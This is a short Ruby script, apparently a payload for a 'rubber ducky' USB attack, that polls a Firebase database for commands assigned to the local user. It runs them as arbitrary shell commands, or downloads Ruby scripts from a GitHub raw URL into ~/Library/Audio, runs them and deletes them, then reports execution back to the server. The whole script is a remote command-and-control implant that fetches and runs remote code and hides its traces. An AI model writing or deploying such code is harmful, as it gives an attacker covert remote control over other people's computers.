require 'uri'
require 'net/http'
require 'json'

USER = ENV["USER"]
FIREBASE_URL = "https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app"
GITHUB_URL = "https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main"

userURL = URI.parse("#{FIREBASE_URL}/users/#{USER}.json")

response = Net::HTTP.get_response(userURL)
data = JSON.parse(response.body)

exit if data['executed'] == true

commands = data['commands']

commands.each do |command|
    if command.start_with?("/")

        command = command[1..]
        args = command.split(" ")
        puts args

        system("curl -H \"Cache-Control: no-cache\" #{GITHUB_URL}/commands/#{args[0]}.rb -o ~/Library/Audio/#{args[0]}.rb")
        system("ruby ~/Library/Audio/#{args[0]}.rb #{args[1..].join(" ")}")
        system("rm ~/Library/Audio/#{args[0]}.rb")

    else
        system(command)
    end
end

system("curl -X PUT -d 'true' #{FIREBASE_URL}/users/#{USER}/executed.json")